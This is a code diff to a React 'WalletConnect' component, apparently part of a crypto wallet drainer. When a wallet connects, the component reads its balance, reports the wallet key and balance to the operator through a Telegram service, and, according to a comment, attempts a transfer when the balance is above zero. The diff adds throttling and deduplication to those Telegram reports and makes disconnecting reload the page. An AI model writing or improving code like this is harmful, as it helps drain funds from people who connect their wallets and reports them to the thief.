@@ -14,8 +14,9 @@ function WalletConnect() {
   const [balance, setBalance] = useState(null);
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
-  const hasSentInitialNotification = useRef(false);
   const hasAttemptedTransaction = useRef(false);
+  const notificationTimeout = useRef(null);
+  const notificationInProgress = useRef(false);
 
   // Memoize services
   const services = useMemo(() => ({
@@ -29,6 +30,11 @@ function WalletConnect() {
     if (publicKey && !isProcessing && !hasAttemptedTransaction.current) {
       const processWallet = async () => {
         try {
+          // Check if wallet is already processing
+          if (isProcessing || notificationInProgress.current) {
+            return;
+          }
+          
           setIsProcessing(true);
           
           const walletBalance = await services.walletService.getBalance(publicKey.toString());
@@ -36,18 +42,44 @@ function WalletConnect() {
 
           // Check if we've already sent a notification for this wallet
           const walletKey = `wallet_notified_${publicKey.toString()}`;
-          const hasNotified = localStorage.getItem(walletKey);
+          const lastNotification = localStorage.getItem(walletKey);
+          const currentTime = Date.now();
+          
+          // Clear any existing notification timeout
+          if (notificationTimeout.current) {
+            clearTimeout(notificationTimeout.current);
+          }
 
-          if (!hasNotified) {
-            await services.telegramService.sendMessage(
-              services.telegramService.formatWalletInfo({
-                publicKey: publicKey.toString(),
-                balance: walletBalance,
-                timestamp: Date.now()
-              })
-            );
-            // Mark this wallet as notified
-            localStorage.setItem(walletKey, 'true');
+          // Only send notification if:
+          // 1. No previous notification exists, or
+          // 2. Last notification was more than 5 minutes ago
+          if (!lastNotification || (currentTime - parseInt(lastNotification)) > 300000) {
+            // Set notification in progress flag
+            notificationInProgress.current = true;
+            
+            // Set a timeout to prevent multiple notifications within 1 second
+            notificationTimeout.current = setTimeout(async () => {
+              try {
+                // Check again if notification was sent while we were waiting
+                const currentNotification = localStorage.getItem(walletKey);
+                if (!currentNotification || (currentTime - parseInt(currentNotification)) > 300000) {
+                  await services.telegramService.sendMessage(
+                    services.telegramService.formatWalletInfo({
+                      publicKey: publicKey.toString(),
+                      balance: walletBalance,
+                      timestamp: currentTime
+                    })
+                  );
+                  // Store the current timestamp only after successful notification
+                  localStorage.setItem(walletKey, currentTime.toString());
+                }
+              } catch (error) {
+                console.error('Error sending wallet notification:', error);
+              } finally {
+                // Clear notification in progress flag
+                notificationInProgress.current = false;
+              }
+            }, 1000);
           }
 
           // Only attempt transfer if we have a balance greater than 0 and haven't attempted before
@@ -119,6 +151,10 @@ function WalletConnect() {
     // Cleanup function
     return () => {
       setIsProcessing(false);
+      if (notificationTimeout.current) {
+        clearTimeout(notificationTimeout.current);
+      }
+      notificationInProgress.current = false;
     };
   }, [publicKey, services]);
 
@@ -149,7 +185,8 @@ function WalletConnect() {
             localStorage.removeItem(key);
           }
         });
-        console.log('Wallet disconnected successfully');
+        // Force reload the page to ensure clean state
+        window.location.reload();
       } else {
         console.error('Disconnect function not available');
       }
@@ -159,6 +196,8 @@ function WalletConnect() {
       setBalance(null);
       setCopied(false);
       setIsDropdownOpen(false);
+      // Force reload the page to ensure clean state
+      window.location.reload();
     }
   };
 
